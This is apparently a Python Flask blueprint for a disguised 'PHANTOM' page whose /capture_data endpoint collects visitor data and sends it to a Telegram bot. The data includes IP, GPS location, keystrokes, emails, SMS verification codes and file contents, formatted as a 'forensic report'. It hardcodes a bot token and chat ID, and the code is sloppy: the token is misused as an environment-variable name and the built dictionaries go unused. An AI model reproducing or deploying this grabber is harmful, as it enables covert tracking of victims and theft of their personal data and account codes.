from flask import Blueprint, render_template_string, request, jsonify
import requests
import logging
import os

script20_bp = Blueprint('script20', __name__)

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = os.environ.get('6133548217:AAFtEqMcFM1vz55YNTI4DBkeZe0Ku_zzOo0')
TELEGRAM_CHAT_ID = os.environ.get('1308711346')

PHANTOM_UI = """
<!-- HTML code remains the same -->
"""

@script20_bp.route('/')
def index():
    return render_template_string(PHANTOM_UI)

@script20_bp.route('/capture_data', methods=['POST'])
def capture_data():
    try:
        i = request.json
        # Validate user input
        if not i:
            return jsonify({"status": "Error", "message": "Invalid input"}), 400

        # Device Fingerprinting
        device_info = {
            'device_type': i['device_type'],
            'operating_system': i['operating_system'],
            'browser_type': i['browser_type'],
            'screen_resolution': i['screen_resolution']
        }

        # Network Information
        network_info = {
            'ip_address': i['ip_address'],
            'subnet_mask': i['subnet_mask'],
            'gateway': i['gateway'],
            'dns_server': i['dns_server']
        }

        # System Information
        system_info = {
            'operating_system_version': i['operating_system_version'],
            'kernel_version': i['kernel_version'],
            'installed_software': i['installed_software']
        }

        # User Behavior
        user_behavior = {
            'mouse_movements': i['mouse_movements'],
            'keyboard_input': i['keyboard_input'],
            'scroll_events': i['scroll_events']
        }

        # Browser Extensions
        browser_extensions = {
            'ad_blockers': i['ad_blockers'],
            'vpns': i['vpns'],
            'password_managers': i['password_managers']
        }

        # Social Media Profiles
        social_media_profiles = {
            'facebook': i['facebook'],
            'twitter': i['twitter'],
            'instagram': i['instagram']
        }

        # Email Addresses
        email_addresses = {
            'email_addresses': i['email_addresses'],
            'password_recovery_emails': i['password_recovery_emails']
        }

        # Phone Numbers
        phone_numbers = {
            'phone_numbers': i['phone_numbers'],
            'sms_verification_codes': i['sms_verification_codes']
        }

        # Location Information
        location_info = {
            'current_location': i['current_location'],
            'ip_address': i['ip_address'],
            'gps_coordinates': i['gps_coordinates']
        }

        # File System Information
        file_system_info = {
            'file_system_hierarchy': i['file_system_hierarchy'],
            'file_names': i['file_names'],
            'file_contents': i['file_contents']
        }

        # Camera and Microphone Access
        camera_microphone_access = {
            'camera_access': i['camera_access'],
            'microphone_access': i['microphone_access']
        }

        # GPS Location
        gps_location = {
            'gps_coordinates': i['gps_coordinates']
        }

        # Device ID
        device_id = {
            'device_id': i['device_id']
        }

        # SIM Card Information
        sim_card_info = {
            'sim_card_number': i['sim_card_number'],
            'sim_card_operator': i['sim_card_operator']
        }

        # Battery Information
        battery_info = {
            'battery_level': i['battery_level'],
            'battery_status': i['battery_status']
        }

        # Message Format updated for Full Data
        message = (
            f"💀 *--- ULTIMATE FORENSIC REPORT ---* 💀\\n\\n"
            f"📅 *TIME:* `{i['time']}`\\n"
            f"🌐 *NETWORK INTEL*\\n"
            f"┣ IP: `{i['ip_address']}`\\n"
            f"┣ Local: `{i['local_ip']}`\\n"
            f"┣ ISP: `{i['isp']}`\\n"
            f"┗ TZ: `{i['tz']}`\\n\\n"
            f"📍 *GEOLOCATION*\\n"
            f"┣ Lat/Lon: `{i['lat']}, {i['lon']}`\\n"
            f"┗ Maps: [Click Here](http://www.google.com/maps/place/{i['lat']},{i['lon']})\\n\\n"
            f"💻 *HARDWARE & OS*\\n"
            f"┣ Platform: `{i['platform']}`\\n"
            f"┣ GPU: `{i['gpu']}`\\n"
            f"┣ RAM: `{i['ram']} GB` | Cores: `{i['cores']}`\\n"
            f"┣ Battery: `{i['battery']}`\\n"
            f"┗ Screen: `{i['screen']} ({i['orientation']})`\\n\\n"
            f"⚙️ *SYSTEM MISC*\\n"
            f"┣ AdBlock: `{i['adblock']}`\\n"
            f"┣ Touch Points: `{i['touch']}`\\n"
            f"┗ Language: `{i['lang']}`\\n\\n"
            f"📎 *FULL USER AGENT*\\n"
            f"`{i['agent']}`"
        )

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
        
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            return jsonify({"status": "Success"}), 200
        else:
            logging.error(f"Error sending message: {response.text}")
            return jsonify({"status": "Error", "message": "Failed to send message"}), 500
    except Exception as e:
        logging.error(f"Error: {e}")
        return jsonify({"status": "Error", "message": "Internal Server Error"}), 500
